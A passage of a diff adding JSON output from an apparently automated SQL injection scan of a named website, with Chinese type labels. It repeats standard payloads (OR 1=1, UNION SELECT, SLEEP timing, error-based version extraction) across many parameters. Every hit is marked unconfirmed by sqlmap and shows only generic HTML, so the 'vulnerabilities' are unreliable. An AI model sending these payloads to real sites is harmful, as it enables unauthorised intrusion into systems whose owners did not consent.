@@ -1,0 +1,1681 @@
+{
+  "timestamp": "2025-10-28T02:31:58.162226",
+  "results": {
+    "https://www.investree.co.th": {
+      "vulnerabilities": [
+        {
+          "type": "错误注入",
+          "parameter": "id",
+          "payload": "1' OR '1'='1",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]>      <html class=\"no-js lt-ie9 lt-ie8 lt-ie7\"> <![endif]-->\n<!--[i",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "id",
+          "payload": "1' OR '1'='1",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "id",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "id",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "id",
+          "payload": "1' AND 1=1-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "id",
+          "payload": "1' AND 1=1-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "id",
+          "payload": "1' AND 1=2-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "id",
+          "payload": "1' AND 1=2-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "id",
+          "payload": "1' AND SLEEP(5)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "id",
+          "payload": "1' AND SLEEP(5)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "id",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "id",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "id",
+          "payload": "1' AND 'a'='a",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]>      <html class=\"no-js lt-ie9 lt-ie8 lt-ie7\"> <![endif]-->\n<!--[i",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "id",
+          "payload": "1' AND 'a'='a",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "id",
+          "payload": "1' AND 'a'='b",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]>      <html class=\"no-js lt-ie9 lt-ie8 lt-ie7\"> <![endif]-->\n<!--[i",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "id",
+          "payload": "1' AND 'a'='b",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "page",
+          "payload": "1' OR '1'='1",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]>      <html class=\"no-js lt-ie9 lt-ie8 lt-ie7\"> <![endif]-->\n<!--[i",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "page",
+          "payload": "1' OR '1'='1",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "page",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "page",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "page",
+          "payload": "1' AND 1=1-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "page",
+          "payload": "1' AND 1=1-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "page",
+          "payload": "1' AND 1=2-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "page",
+          "payload": "1' AND 1=2-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "page",
+          "payload": "1' AND SLEEP(5)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "page",
+          "payload": "1' AND SLEEP(5)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "page",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "page",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "page",
+          "payload": "1' AND 'a'='a",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]>      <html class=\"no-js lt-ie9 lt-ie8 lt-ie7\"> <![endif]-->\n<!--[i",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "page",
+          "payload": "1' AND 'a'='a",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "page",
+          "payload": "1' AND 'a'='b",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]>      <html class=\"no-js lt-ie9 lt-ie8 lt-ie7\"> <![endif]-->\n<!--[i",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "page",
+          "payload": "1' AND 'a'='b",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "search",
+          "payload": "1' OR '1'='1",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]>      <html class=\"no-js lt-ie9 lt-ie8 lt-ie7\"> <![endif]-->\n<!--[i",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "search",
+          "payload": "1' OR '1'='1",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "search",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "search",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "search",
+          "payload": "1' AND 1=1-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "search",
+          "payload": "1' AND 1=1-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "search",
+          "payload": "1' AND 1=2-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "search",
+          "payload": "1' AND 1=2-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "search",
+          "payload": "1' AND SLEEP(5)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "search",
+          "payload": "1' AND SLEEP(5)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "search",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "search",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "search",
+          "payload": "1' AND 'a'='a",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]>      <html class=\"no-js lt-ie9 lt-ie8 lt-ie7\"> <![endif]-->\n<!--[i",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "search",
+          "payload": "1' AND 'a'='a",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "search",
+          "payload": "1' AND 'a'='b",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]>      <html class=\"no-js lt-ie9 lt-ie8 lt-ie7\"> <![endif]-->\n<!--[i",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "search",
+          "payload": "1' AND 'a'='b",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "q",
+          "payload": "1' OR '1'='1",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]>      <html class=\"no-js lt-ie9 lt-ie8 lt-ie7\"> <![endif]-->\n<!--[i",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "q",
+          "payload": "1' OR '1'='1",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "q",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "q",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "q",
+          "payload": "1' AND 1=1-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "q",
+          "payload": "1' AND 1=1-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "q",
+          "payload": "1' AND 1=2-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "q",
+          "payload": "1' AND 1=2-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "q",
+          "payload": "1' AND SLEEP(5)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "q",
+          "payload": "1' AND SLEEP(5)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "q",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "q",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "q",
+          "payload": "1' AND 'a'='a",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]>      <html class=\"no-js lt-ie9 lt-ie8 lt-ie7\"> <![endif]-->\n<!--[i",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "q",
+          "payload": "1' AND 'a'='a",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "q",
+          "payload": "1' AND 'a'='b",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]>      <html class=\"no-js lt-ie9 lt-ie8 lt-ie7\"> <![endif]-->\n<!--[i",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "q",
+          "payload": "1' AND 'a'='b",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "query",
+          "payload": "1' OR '1'='1",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]>      <html class=\"no-js lt-ie9 lt-ie8 lt-ie7\"> <![endif]-->\n<!--[i",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "query",
+          "payload": "1' OR '1'='1",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "query",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "query",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "query",
+          "payload": "1' AND 1=1-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "query",
+          "payload": "1' AND 1=1-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "query",
+          "payload": "1' AND 1=2-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "query",
+          "payload": "1' AND 1=2-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "query",
+          "payload": "1' AND SLEEP(5)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "query",
+          "payload": "1' AND SLEEP(5)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "query",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "query",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "query",
+          "payload": "1' AND 'a'='a",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]>      <html class=\"no-js lt-ie9 lt-ie8 lt-ie7\"> <![endif]-->\n<!--[i",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "query",
+          "payload": "1' AND 'a'='a",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "query",
+          "payload": "1' AND 'a'='b",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]>      <html class=\"no-js lt-ie9 lt-ie8 lt-ie7\"> <![endif]-->\n<!--[i",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "query",
+          "payload": "1' AND 'a'='b",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "user",
+          "payload": "1' OR '1'='1",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]>      <html class=\"no-js lt-ie9 lt-ie8 lt-ie7\"> <![endif]-->\n<!--[i",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "user",
+          "payload": "1' OR '1'='1",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "user",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "user",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "user",
+          "payload": "1' AND 1=1-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "user",
+          "payload": "1' AND 1=1-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "user",
+          "payload": "1' AND 1=2-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "user",
+          "payload": "1' AND 1=2-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "user",
+          "payload": "1' AND SLEEP(5)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "user",
+          "payload": "1' AND SLEEP(5)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "user",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "user",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "user",
+          "payload": "1' AND 'a'='a",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]>      <html class=\"no-js lt-ie9 lt-ie8 lt-ie7\"> <![endif]-->\n<!--[i",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "user",
+          "payload": "1' AND 'a'='a",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "user",
+          "payload": "1' AND 'a'='b",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]>      <html class=\"no-js lt-ie9 lt-ie8 lt-ie7\"> <![endif]-->\n<!--[i",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "user",
+          "payload": "1' AND 'a'='b",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "category",
+          "payload": "1' OR '1'='1",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]>      <html class=\"no-js lt-ie9 lt-ie8 lt-ie7\"> <![endif]-->\n<!--[i",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "category",
+          "payload": "1' OR '1'='1",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "category",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "category",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "category",
+          "payload": "1' AND 1=1-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "category",
+          "payload": "1' AND 1=1-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "category",
+          "payload": "1' AND 1=2-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "category",
+          "payload": "1' AND 1=2-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "category",
+          "payload": "1' AND SLEEP(5)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "category",
+          "payload": "1' AND SLEEP(5)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "category",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "category",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "category",
+          "payload": "1' AND 'a'='a",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]>      <html class=\"no-js lt-ie9 lt-ie8 lt-ie7\"> <![endif]-->\n<!--[i",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "category",
+          "payload": "1' AND 'a'='a",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "category",
+          "payload": "1' AND 'a'='b",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]>      <html class=\"no-js lt-ie9 lt-ie8 lt-ie7\"> <![endif]-->\n<!--[i",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "category",
+          "payload": "1' AND 'a'='b",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "product",
+          "payload": "1' OR '1'='1",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]>      <html class=\"no-js lt-ie9 lt-ie8 lt-ie7\"> <![endif]-->\n<!--[i",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "product",
+          "payload": "1' OR '1'='1",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "product",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "product",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "product",
+          "payload": "1' AND 1=1-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "product",
+          "payload": "1' AND 1=1-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "product",
+          "payload": "1' AND 1=2-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "product",
+          "payload": "1' AND 1=2-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "product",
+          "payload": "1' AND SLEEP(5)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "product",
+          "payload": "1' AND SLEEP(5)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "product",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "product",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "product",
+          "payload": "1' AND 'a'='a",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]>      <html class=\"no-js lt-ie9 lt-ie8 lt-ie7\"> <![endif]-->\n<!--[i",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "product",
